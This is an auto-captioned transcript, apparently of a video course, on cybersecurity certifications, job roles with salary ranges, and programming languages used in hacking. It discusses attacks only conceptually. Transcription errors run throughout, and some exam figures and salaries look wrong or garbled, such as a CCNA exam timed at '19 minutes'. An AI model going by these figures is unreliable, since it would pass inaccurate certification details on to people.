million dollar risk now here it is the
responsibility of the risk manager to
identify which solution would benefit
the organization in the long run so
that's where your cost benefit analysis
comes in and then you're going to
implement the solution and then you're
going to continuously monitor it to
ensure that the risk doesn't surface
again so it depends on which
organization you're talking about but
you i mean you would need at least three
to four years of experience in risk
strategy before you become a risk
manager but these are the certifications
that are going to identify and help you
in your career path as we go ahead now
before we go into cloud computing
courses just one point that i want to
highlight here the first courses that we
talked about with technical the second
we're managing in perspective now even
if it is i.t security that we talk about
in today's world it is more on the
business side that everyone starts
making sense so for example when you
start talking to the management you
always will talk about it
about security from a monetary
perspective and a business impact
analysis perspective so as we go ahead
in iit security uh career paths you will
always mature from a technical guy to a
semi-technical guide to a and then over
over a period to a managerial person and
then probably the c-level executives
like uh the ciso the cfo of the or the
cto chief technology officer so let's
start with the next topic the cloud
computing courses as discussed these are
not mandatory but with today's uh world
where we have everybody has jumped on to
the cloud computing bandwagon you will
want to expand your horizons and get
cloud security under your belt as well
the two courses on your screen the ccsp
and the ccsk are vendor neutral courses
and are more towards a managerial
perspective rather than technical
perspective so the ccsp is the
certificate of cloud security
professional this certification is given
to you by isc square whereas the ccsk is
a certificate of cloud security
knowledge given to you by an
organization called cloud security
alliance ccsp the uh the certificate of
cloud security professionals again has a
holistic view of cloud security they
have listed six different domains in the
certification and isa square has created
a common body of knowledge based on
which it will give you an holistic view
of what steps do you want to look at for
various deployments in a cloud security
now this becomes an advanced
certification uh the first certification
that came across was the ccsk which is
from a body a non-profit organization
called cloud security alliance now this
is again a web-based examination this
one is a little bit easier to attend
than the ccsp so if you want to enter
the cloud security arena i would suggest
you start with the ccsk certificate and
then move on to ccsp if it is technical
that you have in uh that you have in
mind then you become vendor-specific so
either you go for amazon web services
for a public cloud or microsoft azure or
if you want to look at private clouds
we've got vmware certifications and
we've got microsoft hyper-v we've got
citrix certifications so depending on
which vendor or which solution that you
want to deal with you'll have to
identify those vendors and you'll have
to get certified on those specific
technologies each vendor has their own
set of certifications you can just visit
their websites and they have a career
path for their individual certifications
there as well let's talk about advanced
cyber security courses now the gold
standard in advanced cyber security
courses is obviously the cis or the
cissp which is the certified information
systems security professional so when
you're headed for the management courses
or or you're going to look at profiles
like the chief technology officer or the
chief information security officer
you're looking at this particular course
this is a very difficult exam to crack
because you need that experience you
just cannot read books get the knowledge
from those books and pass this exam in
fact you have to prove that you have
five years of experience in two of the
domains that cissp talks about if you
don't you can still attempt the exam but
you get certified as an associate of the
isc square for cissp and you've got six
years to complete the five-year
experience bracket the passing rate of
that exam is less than 50 percent so
it's a tough exam to crack currently
there are the exam consists of 100 to
150 questions and you have to answer
those in
three hours now that sounds like a
simple task but the areas that are
covered in this certification are vast
and the knowledge that is required and
the experience that is required is very
high as well i have seen people gain
around 15 years of experience in the id
field and then attempt the cissp that
being said i've also seen people with
very good knowledge clear the exam in uh
in a couple of by studying for just a
couple of weeks so it depends on how
good you are how good your knowledge is
how good your experience is how good
your understanding on various topics is
and based on that you can crack this
exam easily as well the domains in cissp
are as such we start off with asset
security uh then we have security
architecture and engineering
communications and network security
identity and access management security
operations security assessment and
testing software development security
and security and risk management now we
start off with security and risk
management it talks about again the risk
assessment strategies the risk
assessments life cycles uh risk
calculators and a lot of other
terminology like an annual loss
expenditure expectancy a single loss
expectancy etc asset security will talk
about physical assets or data assets and
how you're going to secure them and the
strategies revolving that security
architecture and engineering will talk
about models security models or
frameworks that will help us create a
policy and administer that policy on our
organization communication and network
obviously we'll talk about network
security different protocols this topic
is all about mapping the osi layer the
tcp layer understanding which protocols
work where and the various encryption
strategies that are there in securing
communications identity and access
management uh this talks about uh access
control lists single sign-ons and so on
so forth security operations the
day-to-day operations of a security
operation center where you're going to
look at incident management change
management and problem management
security assessment and testing
vulnerability assessment and penetration
testing software development security
the software development life cycle
where you're going to talk about secure
coding practices in an application
you're going to talk about various
models that are utilized like the
waterfall model or the agile model to be
implemented for application security so
if you remember some slides back we were
talking about the various domains in
cyber security now if you map that's
those slides with this you will
understand that cisp basically governs
everything that works in the iit
security space so it needs a lot of
understanding a lot of knowledge for
this certification so let's talk about
the job roles in cyber security now
every organization will have its own
naming convention and
their job titles so this may vary a
little bit in the real world but these
are the baseline job requirements and
job functions uh that would be available
or that are required in today's world in
cyber security so let's start talking
about these roles so the first one is
chief information and security officer
also known as cso or ciso now this is a
very privileged position and is a
managerial position in the organization
here you own the cybersecurity of the
entire organization and your job role is
to ensure proper policies proper
frameworks and proper standards are
followed in your organization so it's a
very holistic view that you have there's
no hands-on involved you will not be
involved in vapt but you may actually
ask your team to conduct a vulnerability
assessment and penetration test if needs
requires you'll just take the reports
analyze them and guide the rest of the
team in how to proceed with those
particular incidents so you start off
with at least a graduate degree in
computer science or an id security or a
master's that's a given your
certifications could be all of these or
any of these a cissp is a required
certificate at this point in time the
systems auditor systems manager or the
risk management certification would
obviously help your cause and help you
gain that knowledge that is required for
this particular job role now since this
is a managerial role the requirement is
also very high you will have to have at
least 15 years of experience before you
reach this position so you already
should have worked in the id security
field in multiple domains you should
have had these certifications during
this period which would then qualify you
to become a cso of an organization your
skills obviously would be ethical
hacking no hands-on but you understand
those attacks you know how they have
done you are conversant with how these
technologies work you know the osi layer
the tcp layer you know networking you
know how attacks can be created and
perpetrated computer forensics knowledge
of that would obviously be necessary
over here or would be an advantage if
you are certified in uh forensic
investigations because in case of a
breach you can guide the team of where
exactly to look for what kind of data
mobile security for uh if your
organization has a bring your own device
policy that will help you understand how
to implement security parameters and how
to control data that is going to leave
your organization on some employees
mobile phones an example here would be
employees configuring their emails on
their mobile phones and thus the
attachments can be downloaded on those
phones and you want to ensure that those
documents or attachments do not get
compromised cloud security is also
necessary here because most of the
organizations that you will see will be
connected to a cloud or will be
consuming some services from the cloud
for example salesforce customer
relationship management softwares or
office 365 getting integrated with an
in-house domain networking knowledge is
a must your work experience like i said
would be
around 15 years minimum and you should
have worked in network security you
should know storages you should have a
basic understanding of how hardware
works you should have skills on vendor
management and protection protecting
systems against advanced persistent
threats so you should know how idss ipss
work you should know the latest trends
in the security market and you should
understand which vendors to approach at
what point in time salaries could range
from 100 000 usd to 125 000 or in india
15 lakh rupees to 25 lakh rupees now
these are baseline salaries it will
obviously depend on what kind of an
organization you are joining if it's a
startup your salaries may not be that
high or if it's a global organization's
your salaries could be way more than
what have been projected on the screen
the next role we can talk about is an
information security analyst now here
again the requirement is that you
understand security from a holistic
perspective you're going to collect data
you're going to analyze that data and
you're going to interpret that data
based on your knowledge based on your
experience and try to figure out if
there is something wrong or if there is
something
dishonest going on in the organization
for example collecting a data dump of a
networking device uh for a segment of
time and then analyzing the packets that
are going through that particular
segment to see
if there are any background services
running any background data leakage is
happening or it could be as simple as
you joining a security operation center
and when an incident arises you become
that security analyst where you analyze
the incident you try to investigate what
has happened and then you come out with
what exactly has been impacted and then
try to find a resolution for that so
your baseline again is
you're going to be a graduate in
computer science or an i.t security
field masters will always be helpful but
here it is not required a bachelor's
degree is more than sufficient so the
certifications that you'll require uh
here are the saisa plus which is the
cyber security analyst from comptia and
the ec council security analyst from ec
council now these two certificates help
you understand how you can collect data
what data sources are available and how
to configure them and how to analyze
that data that is what these courses are
all about the cissp course again here
would be an added advantage for you to
understand how to convert that data into
risk analysis and then give a business
impact analysis to your manager along
with the technical report so the skills
that you're going to require for this
job information assurance assurance is
the part where you are investigating to
a certain that the security controls
that have been implemented are working
correctly for example there is a
security architect who has identified
that a firewall needs to be placed and
there's a configuration that has been
done on the firewall a security analyst
over a period of time will analyze the
effectiveness of that particular
firewall and see if there are any gaps
or if there are any problems with the
device and if it needs any more fine
tuning you will also need to know a
little bit of scripting languages so
python it's a scripting language and
when we say linux over here we're
obviously talking about the bash
scripting scenario where you can create
your own scripts and use those scripts
to analyze certain scenarios
cryptography again encryption
understanding of encryption how it works
because you're going to analyze that
kind of data so cryptography is a
required skill set network security is a
must across all platforms across all
rules because that's how computers
communicate with each other over the
internet and the internet work
experience network architecture so
courses like ccna ccnp ccie would be
helpful for you to understand how
network works now this is assuming that
you're using cisco devices for other
devices like juniper there are different
courses from those vendors log
management so understanding how a syslog
server works or how a siem tool works
and utilizing those tools to collect
data and use that data to for further
analysis the salary here could vary from
95 to 123 000 usd or 5 lakhs to 18 lakhs
per annum in india again the salaries
are baselines depends on which
organization you're joining startup may
not be able to pay you that much global
organization could pay you a lot more
than what is being showcased but these
are the average salaries across all job
roles right so let's talk about the
forensic computer analyst job profile so
the forensic computer analyst job role
is where your job description would be
to analyze after attack has been
identified or an impact has been
observed in your organization so this
job role would definitely be after the
attack has happened so you will be going
in and you're going to try to analyze
what got impacted how did that attack
happen which all components have been
affected and if there has been any data
breach so the other role would be where
you're going to do a reverse engineering
trying to identify who attacked you ip
addresses mac addresses or any trades
that you can find of the attacker and
how exactly did the attack take place
what was the vulnerability what was the
exploit and that would give you a
knowledge which you can pass on to the
security analyst who can then further
try to resolve that particular problem
your certifications would be chfi which
is a certified hacking forensic
investigation certificate that we saw
from ec council there are other
certificates in the market as well such
as cfce and gcfa the skills that you're
going to require here are analytical
skills you're going to analyze a lot of
data now understand the fact that the
attack has happened it has been
identified by some reason and you are
being tasked with the uh requirement of
identifying what exactly happened what
got affected and to what extent has been
the damage so you're trying to reverse
engineer something that has already
happened and you're going to try to
think of how attacker would have created
that particular attack obviously you
will have to create reports after that
and report writing skills should be
excellent your communication should be
somewhat of a techno managerial kind of
a scenario so you should be technical
you know all the technical things but
you can translate them into simple
english for non-technical people to
understand now understand the fact that
when you send these reports to the
management the management will have
basic understanding of those keywords
they would not be technically adept of
hacking or of forensics so your report
writing skills would be a huge
requirement at this point in time your
communications how you communicate with
your peers how you're going to
communicate your requirements what you
want for that analysis what kind of
tools do you require and when you create
those reports and you're going to
communicate them or you're going to
present them to the management in very
precise manner that's where your
communication skills would be required
and your knowledge on digital storage
devices where you're going to acquire
data and you're going to store that data
for example there may be scenarios where
a law enforcement agency may come in and
you will have to collect that data in a
manner where you have to store it and
then present it in a court as evidence
later on so here some requirements would
be where you know the law of the land
and you know how to acquire that
evidence how to store that evidence you
know the chain of custody so that you
can present that data in a court of law
and prove that it is still valid data
your work experience you should know
your operating systems how those
processes work where the cache is how is
it stored how is data processed so that
you can access those areas of the
operating systems or those applications
and you can extract that data from those
storage areas scripting languages would
be required for you to create let's say
powershell scripts or bash scripts
depending on the operating system and
then automate some tasks for collecting
some data data processing skills because
you're going to collect data you're
going to process that data you're going
to look at processes that are running in
the background so all of that would be
required as a work experience salary
again would vary from 69 to 114 000 usd
and in india around 5 lakhs to 18 lakhs
per annum looking at a security
architect's role so a security architect
is a person who designs an architect
security so your job role would be where
let's say there's a network deployment
that's going to happen and you are being
called in to design a plan on how you
want to implement security on the entire
network or you could be on the cloud and
you want a new deployment on the cloud
and you're talking about cloud security
so here you're going to design how that
security is going to function your job
rules would be where you want to place
those firewalls what kind of firewalls
you want to place or what kind of idss
ips's unified threat management systems
or endpoint antivirus systems would be
required here you would be looking at
security controls and placement of those
security controls in various scenarios
for example what kind of email filters
do you want to create or what kind of
email
scanning you want to implement in your
organization to scan incoming
attachments or outgoing emails another
example would be where you are looking
at routing and you're looking at how
data packets are going to travel across
the network and you have some dedicated
parts that you have to create to ensure
that all those packets go through a
firewall a firewall is configured in a
particular manner which will either
allow or disallow that packet based on
the configuration that you are going to
suggest again
the baseline would be graduate in a
computer science or iit security field
here a master's degree would be
advisable over the period of your career
right
and again your courses like ceh the
certified ethical hacking course or the
security plus or the ecs ecsa course the
ec council certified security analyst
course would be prescribed cissp is open
across all tables across all job roles
so as you get experience and you've got
at least five years of experience that's
when you try to attempt the cssp
certification but you start off with ceh
then you move on to ecsa security plus
and then that's your career path to
become a security architect again the
experience here would be at least seven
to eight years in id security to become
a successful security architect and an
organizational level skills operating
systems application security cloud
security network security you're
basically you're going to design the
security of an organization or of a
particular product so you need to know
almost anything and everything there is
about information technology work
experience as suggested seven to eight
years is ideal but anything between five
to ten years would be a requirement in
id security the five to ten years of
experience that we're talking about is
entirely nit security so you either have
a vulnerability um management experience
or a patch management experience or you
have experience in application security
or in network security so all of that
combined should be around five to ten
years for you to become a successful
security architect salaries would range
from 50 000 to 100 000 us dollars and
six lakhs to 20 lakhs in india and
rupees then let's talk about id security
consultant now the main job role of a
consultant is to provide intelligence on
various technologies so here you could
become a business consultant where you
may need to go to the client side check
the requirements come back to your
organization and then detail the team of
the requirements and then map the
solutions that you're going to offer
based on those requirements or
a client needs to implement a security
architecture or needs to implement
security controls you as a consultant
just advise them how it is done what is
required what kind of policies should be
there and then provide that expertise to
them so this is basically more of a
business oriented role from a security
perspective this is where you have to
know it all so not only technical but
you'll also need to have knowledge on
how businesses function uh what kind of
security controls are available and
which security controls to position at
what security areas so again physical
security is also in play you're going to
talk about cctv cameras you're going to
talk about physical security about
server rooms you're going to talk about
disaster recovery and business
continuity planning so this basically
becomes a consultant's view of how a
business should function in the long run
again the educational requirement a
graduate degree in computer science or
i.t security or a master's degree is
advisable at this point in time cissp
crisc cism these are a must like i said
these are advanced certifications and
this is an advanced job profile as well
so assuming you have cissp
that already assumes that you probably
would have done your ceh or security
plus or scissor plus and those
certifications earlier on in your career
path here programming skills again you
shouldn't be a developer that's not a
requirement but you shouldn't understand
programming you should look at secure
coding practices and it should
understand how those practices are to be
implemented in a software development
life cycle risk management is a must at
this point in time you need to identify
threats you need to identify how those
threats are posing at risk to the
organization your risk management skills
how you're going to calculate that risk
and present it to the management not
only uh the next skill not only
firewalls but ids ips's any security
controls that you can implement
including identity access and management
knowing your operating systems is a must
windows linux or maybe mac the various
flavors of linux operating systems and
understanding of encryption uh let's see
how the public key infrastructure works
what is a private key what is a public
key symmetric and isometric encryption
and all of those details is something
that you should know work experience a
minimum around five to ten years of
professional experience after which you
can be eligible for a i.t security
consultant's job role salaries could
vary from 80 000 to 86 000 us dollars
and 5 lakhs to 19 lakhs in indian rupees
then we have the security systems
administrator job profile uh this is a
systems administrator from a security
perspective so so you're not going to be
an administrator from uh administrators
perspective such as administering
windows or linux operating systems or
their deployments but you would be
responsible for the security of these
operating systems and creating a secure
environment for the internal consumption
of the organization so as a security
systems administrator your job role
would be to administrate let's say
firewalls or the security of certain
switches routers or data traffic or
you're going to analyze data traffic or
you're going to create rules of which
protocols are allowed to pass through
the firewall and which protocol should
be blocked the requirements again
educational wise you should be a
graduate in computer science or id
security comchia security plus ch ccnp
ccna these are the certifications that
you want to look at to become a system
administrator skills computers networks
is a must so networking skills
understanding uh of how ospf pgp
protocols work maybe even wipe so sip
protocol comes into the picture here
understanding the tcp and the osi layer
how these function at what layer which
protocol works how these protocols
translate into each other and how the
data packet is transmitted firewalls any
security controls and your operating
systems work experience around four to
seven years of experience in the network
field would allow you to be eligible for
a systems security administrator profile
salary here could be around hundred
thousand two hundred and ten thousand
and in india it would be around two
lakhs to nine lakh indian rupees then we
have the id security engineer now the id
security engineer would be a job role
where you are when uh you are a part of
the security operations center and there
are incidents that come on in daily talk
for the organization which you are going
to investigate and you're going to try
to resolve those incidents so again
graduate in computer science or an i.t
security graduation would be required
ceh ccnp ccna or security plus these are
the certifications that you want to look
at problem solving skills that's a must
because you're going to be solving those
problems on a day-to-day basis and you
will have certain time frames that you
have to adhere to computer languages
that's if you are going to be an
application security engineer as well
where you want to debug some problems
later on to analyze what the root cause
was and then try to translate that into
and try to create a resolution based on
that analysis support skills because
you're going to support the day-to-day
activity of the organization so whenever
there is an incident you will be the
person who would be called you're going
to support these individuals who have
faced these incidents and you're going
to resolve this problems for them if the
organization is using a cloud cloud
knowledge would be required for example
there there was an incident that
happened on office 365 and you're called
in to analyze and collect logs from
those particular deployments so your
understanding of cloud would help you at
that point in time networking obviously
yes because again like i said network is
the way where you're going to
communicate on the internet and the
internet so those skills would be
required across all i.t job profiles in
the security field work experience you
should know security control experience
and securing cloud maybe an itil or itil
the information technology
infrastructure library certification
would be something that you want to look
at because uh that talks about incident
management problem management and change
management which is something that
you'll be doing on a daily basis as a
security engineer salaries would vary
from hundred and six thousand to hundred
and twenty nine thousand uh us dollars
or three lakhs to ten lakhs indian
rupees then we have a penetration
testers profile now this is completely
technical this is where you are an
ethical hacker so you're going to craft
exploits you're going to create those
attacks and you're going to try and
figure out if those attacks can be
successful against an organization and
if yes you're going to create those
reports and send it to your manager so
it's a complete hands-on role complete
technical role and this is where your
knowledge about anything and everything
that is technical in the computer field
is a must so again a graduate degree in
information technology or cyber security
ch security plus an lpt now ceh
certified ethical hacker or security
plus these are baselines where
penetration testing is taught so these
courses basically talk about ethical
hacking what are the requirements of
ethical hacker how you're going to
utilize these tools and how you're going
to create those attacks so these are
hands-on certifications which teach you
how these attacks work how to recreate
those attacks yourselves and what to
expect out of those attacks lpt or the
license penetration tester is an
advanced certification which comes after
the ecsa course ec council security
analyst course so this as the name says
is a license from ec council which gives
you a certificate to showcase that you
have the required skills to become a
penetration tester your skills problem
solving scripting languages would be 100
necessary at this point in time because
you're going to create your own attacks
so you may have a requirement where you
have to create your own powershell
script to create an attack or a bash
script or maybe writing an exploit in
metasploit in ruby language knowledge of
operating systems and software so how
applications work what is the
application programming interface what
is the common gateway interface how do
they transmit data how do they handle
data how do applications talk to each
other how do applications talk to a
database and vice versa all of those
requirements come into the picture
networking protocols of course
networking like i said across all job
profiles in iit security work experience
two to four years of experience in
security with practice and penetration
testing so two to four years as a
penetration tester now the question is
if you don't have experience then how do
you become a penetration tester so there
is a lot of bug bounty programs that
where you can enroll and you can do it
as a freelancer to get hone your skills
and when you get those bounties against
your name you can use them as
experienced in your profiles which will
be counted against those two to four
years of experience as a penetration
tester again salaries would be from
fifty thousand five hundred usd to a
hundred thousand uh in indian rupees it
would be around three and a half lakhs
to twelve lakhs per annum so these are
the job rules in cyber security let's
understand the importance of knowing
programming for hacking
you might wonder if programming is a
necessity to become a hacker as you
might be aware hacking involves breaking
the protocols and exploiting a network
thus being a hacker requires you to
understand the languages of the software
that you are focusing on
hence it is required that a hacker knows
coding having zero coding knowledge will
definitely limit your opportunities in
the future
knowing different programming languages
is undoubtedly an asset for hackers
everyone wants to become a hacker today
however it is not as easy as it is shown
in numerous movies it takes plenty of
practice and programming knowledge to
become an ethical hacking expert
if you want to become a hacker it is
imperative that you have a knack for
programming languages it is a known fact
that some of the world's best hackers
started off as programmers
if you know how to program you will be
able to dissect a code and analyze it
you can write your scripts or malware
that can be used on the victim
yes there are several ready-made scripts
available today however you might need
to apply your skills in case the
available scripts don't work well for
you
sometimes when script modification is
required you should be in a position to
do that in such a scenario zero
knowledge of the respective programming
language will definitely be a hindrance
programs can also help you automate
multiple tasks which would normally take
a lot of time
codes allow you to penetrate different
fields you want to hack it will help you
identify the plan behind an attack and
defend against deadly hacking techniques
and make your cybersecurity career
worthwhile
it will help you understand the working
of the target system or application
before carrying out an exploit
now that we have an idea as to why
programming is important for hackers let
us understand which programming
languages should a hacker learn
there are several programming languages
for hacking and it might be overwhelming
to choose from the endless list
here we are to help you with that
do keep in mind that your choice of
programming language will also depend on
the type of system you are targeting and
your strategy
let us now move on to the list of the
top programming languages that are
extensively used by hackers around the
world
as you see on your screens here we have
the top five programming languages for
hackers let us go through them one by
one
number one on our list is one of the
most popular programming languages today
that is python
python is a general purpose programming
language and in the field of hacking it
is mainly used for exploit writing
it is referred to as the de facto
hacking programming language it plays a
crucial role in writing hacking scripts
exploits and malicious programs
one great feature that makes hacking
easy with python is the availability of
ready-made modules
for example os modules are available if
the target is a native operating system
for networking there is a socket module
and a lot more
python socket programming can be used
for discovering vulnerabilities in a
system since python code helps in
checking the security integrity of
systems and it can also be used to
exploit them
python has a massive community that
helps with third-party plugins every day
it is also an easy to read language with
a simple syntax this will be helpful for
beginners you can easily write
automation scripts using python and it
also makes prototyping much faster
moving on to our second programming
language we have javascript
currently javascript is one of the best
programming languages for hacking web
applications
a good understanding of javascript
allows a hacker to discover
vulnerabilities and carry web
exploitation since most of the web apps
use javascript or one of its libraries
knowing javascript will help you
discover flaws in web applications
javascript can be used to read saved
cookies and security experts also use
javascript to develop cross-site
scripting programs for hacking
javascript is known for carrying out
attacks like cross-site scripting
javascript can also be used to spread
and reproduce malware and viruses easily
initially javascript was a client-side
scripting language however with the
release of node.js it now supports
back-end development this implies a
larger field for exploitation
a hacker can now use javascript to snoop
the type towards inject malicious code
and track browsing history to name a few
number three on our list is php
hypertext preprocessor or php is a
dynamic server-side programming language
that is used to build websites
hackers should understand php as it will
help them understand web hacking
techniques better
especially if you're into web hacking
then getting your hands on php would be
an asset
php is used in server side scripting
using php you could write a custom
application that modifies settings on a
web server and makes a target server
susceptible to attacks
with the help of php you can also
eliminate any vulnerabilities in your
code
php is one of the most powerful server
side languages used in most of the web
domains
this shows how learning php can help you
with web hacking and also help you fight
against malicious attackers
popular content management systems run
on a foundation of php hence having a
strong knowledge of php can help you
protect or compromise such websites
next on a list of the best programming
languages for hackers is sql
sql is the acronym for structured query
language
although sql is not a traditional
programming language it is a language
used for only communicating with
databases
several systems like mysql postgresql
store their data in databases
sql is used to interact with such
databases in order to organize add
retrieve delete or edit data from a
database
having an in-depth knowledge of sql lets
you comprehend the structure of a
database thereby helping you decide
which scripts or tools to deploy
sql is used for the purpose of web
hacking sql is undoubtedly the best
programming language when it comes to
hacking into a large databases
it will be impossible to contract
database attacks without a good
understanding of sql
using sql hackers can perform an attack
known as sql injection attack such an
attack enables hackers to access
confidential information from databases
sql is used by hackers to develop
various hacking programs based on sql
injection
sql injection is used to bypass web
application login algorithms that are
weak
such an attack can also help a hacker
view and modify confidential information
from databases
finally at number 5 we have the c
programming language
it is no surprise that we have c the
mother of all programming languages on
our list
it is used massively in the security
field it helps with exploit writing and
development
the low level nature of c provides an
edge over other programming languages
used for hacking
a hacker can use the c programming
language to his or her advantage when it
comes to accessing low-level hardware
components such as the ram
security professionals mostly uc when
they are required to manipulate system
resources and hardware
c also helps penetration testers write
programming scripts
most operating systems and computer
programs are coded in c language hence
learning c you will help hackers get an
overview of the structure of operating
systems
c is also used to create shell codes
root kits exploits built undetectable
malware key loggers and much more
sometimes it is also advisable to learn
both c and c plus plus as they both come
in handy for hackers
so those were our top five programming
languages for hackers do keep in mind
that the most important step of becoming
a hacker is to learn various programming
languages it will be great if you can
master a variety of programming
languages as your target will not be the
same always on that note in addition to
previously mentioned programming
languages we have an additional list of
languages that are also well recognized
for hacking let's have a look at our
honorary mention
first we have ruby the ruby programming
language has been used for exploitation
for quite some time now
there can be a close comparison drawn
between ruby and python based on its
syntax
however ruby is more web focused
ruby can be used to write either small
or large scripts and can be used
interchangeably with bash scripting
it offers good flexibility while writing
exploits ruby has been used by several
hackers to exploit corporate systems it
is not that easy to master ruby and that
is one reason why mncs look for
professionals who know ruby
second we have pearl
although pearl has lost its old fame it
still holds value in the hacker
community for exploit writing
there are systems that still run on perl
as it was the go to solution once
it is a great language that can help you
manipulate linex text files and help you
create tools and exploits
code bases still do occupy a
considerable portion of corporate tools
third on our list is html many of you
might have wondered why we didn't
mention html yet
yes no programming list is complete
without mentioning html
the hypertext markup language html is a
standard markup language used for
creating web pages
it glows the whole internet together and
it is the language of the web
this shows the importance html has
an understanding of html is vital to
play with web applications
html also finds its use in developing
hybrid mobile and desktop apps
html is a must if you want to master
this field having said that html is not
that tough for language to learn hence
it is advised to master html if you want
to compromise web applications
and finally at 4 we have assembly level
language
it is undoubtedly one of the most
powerful yet hardest programming
languages to learn
it is a complicated low-level
programming language
for hacking primitive systems assembly
is one of the best programming languages
the best part of assembly is that you
can instruct machine hardware or
software using it
assembly language helps a hacker
manipulate systems straight up at the
architecture level
it is also the most suited coding
language to build malware like viruses
and trojans
it is considered to be the best language
for jobs that are time critical
reverse engineers use assembly language
for example if you're interested in
software cracking and if you want to
reverse engineer a piece of software
that has already been compiled assembly
is the go-to choice
as complicated as a language sounds the
results it produces are highly fruitful
so those were the additional programming
languages that can help you become a
skilled and successful hacker we should
keep in mind that a strong understanding
of programming languages help cyber
security professionals stay on top of
cyber criminals
importance of a cyber security
certification first and foremost when i
see a certification i look at it from
three different aspects the first is the
training itself which allows me to gain
the knowledge which allows me to
understand the aspects of security or
whatever the certification is there for
the second aspect is the exam itself how
do i need to prepare myself for the exam
and how do i need to approach the exam
how do i need to ensure that i pass in
my first attempt and the third aspect is
the certification itself which allows me
to be eligible to apply for a particular
job role so obtaining a cyber security
certification ensures or shows uh to the
organization that you're applying to
that you do have that prerequisite
knowledge and you should be shortlisted
for an interview the knowledge that you
have gained during the training will
help you when you attend that interview
and when you attempt to answer the
questions asked to you so these
certifications are designed for a
specific role
for example a forensic investigation
certificate will teach you how to
investigate a crime scene forensically a
digital crime scene for a matter of fact
a certified ethical hacking course will
teach you about penetration testing so
it is you who's going to decide which
certification you require and then
attempt get certified on it of course a
fresher with a cyber security
certification will have better
employment opportunities because they
can showcase their knowledge with the
certification that they already have
even professionals who want to enhance
their careers can get into managerial or
advanced certifications to improve on
their knowledge and get promoted in
their job profiles so cyber security
cringe certifications can be classified
in three different aspects the first one
being the foundational level then the
managerial level and the advanced level
in the previous video we just had a
small overview here we are going to
discuss about what the certification
covers how the exams are conducted and
the price points for each and every exam
so let's start with the foundation of
certifications we start off with ccna
which is the basic certification for
networking so the ccna routing and
switching certification basically it
helps you build your networking career
you will join an organization as a
networking engineer where you can help
the organization establish the routing
uh the pathing of how data packets will
travel across the network this
certification covers all the basic
concepts that you require to understand
networking the basic requirements for
this certification are that the
candidate must have a bachelor's degree
but apart from that there are no other
prerequisites so it's just that you need
a bachelor's degree and then you can
apply uh you can study for this you can
undergo a training and then you can
attempt the exam uh the certification
provider obviously is cisco so the
knowledge that is limited to this
training and certification is for cisco
devices only the exam fees for this
certification is approximately 325
dollars the exam when it is conducted uh
it has around 50 to 60 odd questions
which need to be answered in 19 minutes
the type of questions that you're going
to get is multiple choice questions
where you have a question and four
answers and you have to choose the
correct answers among those drag and
drop where you have to click on an
object and drag it to its appropriate
place probably a architectural diagram
and you have to let's say pick on a
router and place it into a particular
position if you place it correctly you
answer the
answer the question correctly otherwise
it's wrong and a simulator where you go
where there could be a configuration you
need to configure it in a particular
manner and then check whether the
configuration is correct or not the pass
mark is around 800 to 850 out of a
possible thousand marks so each question
will have a different weightage
depending on the depth of the question
depending on the difficult level of the
question or the difficulty level of the
question which uh would then count
towards your marks and if you score 800
to 850 that's when you clear the exam
the job roles as we have discussed over
here would be more more on the network
administrator side or a network engineer
site depending on the level of
experience that you have the salaries
that are expected from these job roles
in the us are around fifty five thousand
dollars to ninety thousand dollars
annually the next one is the komcha
certification called security plus
comchai is also a global certification
authority for uh infosec courses so this
certification teaches candidates on how
to secure applications networks and
devices it focuses on hands-on practical
skills in the field of network security
i have trained people on this
certification myself so i know this
certification is quite hands-on it deals
with the concepts to the core it helps
you understand the concepts and then in
the practical hands-on demo uh you need
to execute the practical yourself so
that you can gain that knowledge the
recommended level for a candidate to
attempt this training would be at least
around two years of experience in the it
sector in addition if you have already
been certified for network plus
certification from comchia which is the
baseline networking certification this
is also a preferred way to go for this
certification as said comchai is the
certificate provider and the exam fees
for this certification is 339 dollars
the exam is quite simple 90 questions in
90 minutes that's one minute per
question it sounds like a lot of time
but believe me the questions can be a
little bit confusing can be a little bit
lengthy so you will require all those 90
minutes to answer those questions
especially when they're tricky and
they're technical in nature the
questions would be multiple choice and
performance based the past mark for this
exam is around 750 points out of a
possible 900. the job profiles for this
kind of certification is when you want
to apply for a security analyst position
or a security engineer's position where
you're going to analyze some data to
understand and figure out what problems
are ongoing in the organization uh the
average annual salary of this person
would be around 72 000
then comes the ceh or the certified
ethical hacker training from ec counsel
now this is a very well-known course and
also uh ac council is a global
certifying authority very well accepted
across a lot of countries uh this is an
offensive certification so here you're
basically trying to become a penetration
tester you're taught how to hack your
taught how to attack a particular
organization from an ethical hacker's
perspective so the job profiles that
you'll be looking here are of a pen
tester where you go into an organization
you test their security controls or you
test their devices find out flaws within
them and then provide recommendations of
how to plug those flaws or mitigate
those flaws and improve the security of
that organization it is recommended that
you have two years of experience at
least in networking or security for
these uh to attempt this kind of
trainings and certifications again a
basic understanding of networking maybe
a little bit of applications operating
systems would be necessary before
attempting this certification the
certification provider is ec council and
the exam fees for this certification is
so the exam here would be 125 questions
which needs to be attempted in four
hours and you will only get multiple
choice questions in here now for ce
there are two exams one is the multiple
choice questions and the second is a
practical exam where you need to
solve some given problems to you in a
ilab scenario and if you are able to
solve them properly you then get
certified for ceh practical the cutoff
varies from 65 to 85 percent depending
on the questions that you have answered
and the weightage associated with each
and every question as said the job roles
would be as a penetration tester a
security engineer and your salaries
would start from around 90 000 annually
then comes the cnd or the certified
network defender also from ec council
now this is more on the network defense
side so here again the job rules would
be where you're where there's a network
that you have and you're going to try to
secure the network and the
communications that are going to travel
over the network so you need to be a
network administrator network security
engineer or
in a similar profile to understand how
networks work and then you're going to
attempt to secure those networks the
certificate provider again is ec council
and the certification is placed a little
bit below ceh so it becomes network
defense then ceh where you're going to
become a penetration tester the exam
fees for this certification is 350 us
dollars the exam the exam is of 100
questions to be answered in four hours
again it's just a multiple choice
questions so you get a question with
four options you answer the correct one
and you move on to the next question the
past percentage again varies from 60 to
85 percent depending on the questions
answered and the weightage of that
question job rules to be applied network
defense technician cnd analyst or a
security analyst from a network
perspective salaries would range from 65
000 to 75 000 per annum then comes the
forensic investigator course which is
exactly what it is digital forensic
investigator this will help you
understand how computers work where data
is stored and how you can retrieve that
data to investigate a crime that has uh
taken place so the candidate must have
at least two years of experience in the
information security sector they need a
good understanding of how networks work
how computers work how operating systems
work how they store data
the location where that data is stored
how databases work how those databases
store those data and so on so forth this
certification is start after
mainly in the law enforcement areas but
there are a few corporates that offer
forensic investigation as a service
especially when a corporate gets
compromised and they want to
conduct their own investigations the
certification provider for this is also
ec council and the exam fees are 500
